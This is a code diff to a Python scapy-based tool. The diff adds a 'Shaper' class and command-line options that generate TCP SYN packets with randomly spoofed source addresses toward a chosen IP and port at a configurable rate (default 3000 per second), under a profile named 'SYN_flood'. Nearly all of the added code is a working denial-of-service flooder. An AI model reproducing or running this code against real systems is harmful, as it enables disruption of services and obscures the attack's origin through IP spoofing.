@@ -17,6 +17,80 @@ def print_w_pid(line):
     print('[{}] {}'.format(current_process().ident, line))
 
 
+class Shaper(object):
+    def __init__(self, ip_generator, dst, dport, verbose):
+        self.buffer = []
+        self.pkt_counter = 0
+        self.sent_counter = 0
+        self.ip_generator = ip_generator
+        self.dst = dst
+        self.dport = int(dport)
+        self.pkt = None
+        self.time_last_insertion = time.time()
+        self.verbose = verbose
+        self.avg_rps_counter = 0
+
+    def fill_buffer(self, rps, counter, profile):
+        while True:
+            print_w_pid('Filling buffer ...')
+            print_w_pid('Selected profile: %s' % profile)
+            while rps != len(self.buffer):
+                # Define IP headers
+                ip_h = scapy.IP()
+                ip_h.dst = self.dst
+                if profile == 'SYN_flood':
+                    ip_h.src = next(self.ip_generator)
+                    # Define TCP headers
+                    tcp_h = scapy.TCP()
+                    tcp_h.sport = scapy.RandShort()
+                    tcp_h.dport = self.dport
+                    tcp_h.flags = 'S'
+                    # Assemble the network package
+                    pkt = ip_h / tcp_h
+                    self.buffer.append(pkt)
+            counter, self.time_last_insertion, self.avg_rps_counter = \
+                self._send_batch(self.buffer, counter, self.time_last_insertion, self.avg_rps_counter)
+            self.buffer[:] = []
+
+    def _send_batch(self, buffer, sent_counter, time_last_insertion, avg_rps_counter):
+        payload_buffer = buffer
+        pause = 1.0
+        pkt_counter = len(payload_buffer)
+
+        # Sending ...
+        [scapy.send(pkt, verbose=self.verbose) for pkt in payload_buffer]
+
+        # Buffer clearing
+        if pkt_counter:
+            payload_buffer[:] = []
+
+        time_after_insertion = time.time()
+        pause -= time_after_insertion - time_last_insertion
+
+        if pause < 0.0:
+            pause = 0.0
+
+        avg_rps = pkt_counter / (time_after_insertion + pause - time_last_insertion)
+
+        avg_rps_counter += avg_rps
+
+        # line_template = 'Sent {} packages; took {:.3f}; actual avg eps: {:.0f}'
+        # print_w_pid(line_template.format(pkt_counter, time_after_insertion - time_last_insertion, avg_rps))
+        line_template = 'took {:.3f}; actual avg rps: {:.0f} '
+        print_w_pid(line_template.format(time_after_insertion - time_last_insertion, avg_rps))
+
+        # Statistics.
+        # if sent_counter % 1000 == 0 and sent_counter > 0:
+        #     line_template = 'Sent {} packages; took {:.3f}; actual avg eps: {:.0f}'
+        #     print_w_pid(line_template.format(pkt_counter, time_after_insertion - time_last_insertion, avg_rps))
+
+        # sys.stdout.flush()
+        sent_counter += pkt_counter
+        time_last_insertion = time.time()
+
+        return sent_counter, time_last_insertion, avg_rps_counter
+
+
 class Worker(Process):
     def __init__(self, *args, **kwargs):
         super(Worker, self).__init__()
@@ -38,17 +112,17 @@ class Worker(Process):
         parser.add_argument('-l', '--list', action='store_true',
                             help='list of all allowed profiles')
 
-        parser.add_argument('-v', '--verbose', action='store_true',
+        parser.add_argument('-v', '--verbose', action='store', type=int, default=0,
                             help='verbosity level')
 
-        parser.add_argument('-p', action='store', required=True, choices=['tcp', 'udp'],
-                            help='network protocol')
+        parser.add_argument('-dst', action='store', required=True,
+                            help='destination IP Address')
 
-        parser.add_argument('-dst', action='store', nargs='+', required=True,
-                            metavar='IP:port')
+        parser.add_argument('-dport', action='store', required=True,
+                            help='destination port')
 
-        parser.add_argument('-tps', action='store', type=int, default=3000,
-                            help='transactions per second')
+        parser.add_argument('-rps', action='store', type=int, default=3000,
+                            help='requests per second')
 
         parser.add_argument('-n', action='store', type=int, default=1,
                             help='number of worker processes (default: 1)')
@@ -56,53 +130,49 @@ class Worker(Process):
         return parser.parse_args()
 
     def run(self):
-        self._start(self.get_ip())
+        self._start()
+
+    def _start(self):
+        shaper_buffer = Shaper(self.ip_gen(), self.kwargs['dst'], self.kwargs['dport'], self.kwargs['verbose'])
+        shaper_buffer.fill_buffer(self.kwargs['rps'], 0, self.kwargs['profile'])
+        # [print_w_pid(_.summary()) for _ in got_buffer]
+
+    # def _start(self):
+    #     # Define Ether headers
+    #     # ether_h = scapy.Ether()
+    #
+    #     # Define IP headers
+    #     ip_h = scapy.IP()
+    #     ip_h.src = self.get_ip()
+    #     ip_h.dst = '10.206.255.122'
+    #
+    #     # Define TCP headers
+    #     tcp_h = scapy.TCP()
+    #     tcp_h.sport = scapy.RandShort()
+    #     tcp_h.dport = [3389, 1468]
+    #     tcp_h.flags = 'S'
+    #
+    #     # Define ICMP headers
+    #     # icmp_h = scapy.ICMP()
+    #     # icmp_h.id = '0x6003'
+    #
+    #     # Assemble the packet
+    #     pkt = ip_h/tcp_h
+    #     # pkt = ip_h/icmp_h/"XXXXXXXXXXX"
+    #
+    #     print_w_pid(pkt.summary())
+    #
+    #     # Sending packages ...
+    #     scapy.send(pkt, verbos=0)
+    #     # ans, unans = scapy.sr(pkt)
+    #     # ans.summary()
 
     @staticmethod
-    def _start(ip):
-        # Define Ether headers
-        # ether_h = scapy.Ether()
-
-        # Define IP headers
-        # ip_h = scapy.IP()
-        # ip_h.src = '10.206.255.170'
-        # ip_h.dst = '10.206.255.122'
-
-        # Define TCP headers
-        # tcp_h = scapy.TCP()
-        # tcp_h.sport = random.randint(1000, 9000)
-        # tcp_h.dport = [3389, 1468]
-        # tcp_h.flags = 'S'
-        # tcp_h.seq = random.randint(1000, 9000)
-        # tcp_h.window = random.randint(1000, 9000)
-
-        # Define ICMP headers
-        # icmp_h = scapy.ICMP()
-        # icmp_h.id = '0x6003'
-
-        # assemble the packet
-        # pkt = ip_h/icmp_h/"XXXXXXXXXXX"
-        # pkt = ip_h/tcp_h
-
-        # print_w_pid(pkt.summary())
-
-        # Sending packages ...
-        # scapy.sr(pkt)
-        print_w_pid(scapy.RandShort())
-        pkt = scapy.IP(dst='10.206.255.122')/scapy.TCP(sport=scapy.RandShort(), dport=1468, flags='S')
-        # print_w_pid(pkt.summary())
-        ans, unans = scapy.sr(pkt)
-        ans.summary()
-        # scapy.send(pkt, verbos=0)
-
-        # print_w_pid(pkt.command())
-        # pkt.show2()
-        # scapy.ls(scapy.ICMP())
-
-    @staticmethod
-    def get_ip():
-        ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
-        return ip
+    def ip_gen():
+        while True:
+            yield ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
+        # ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
+        # return ip
 
         # sender_inst = None
         # if self.kwargs['gather_stats']:
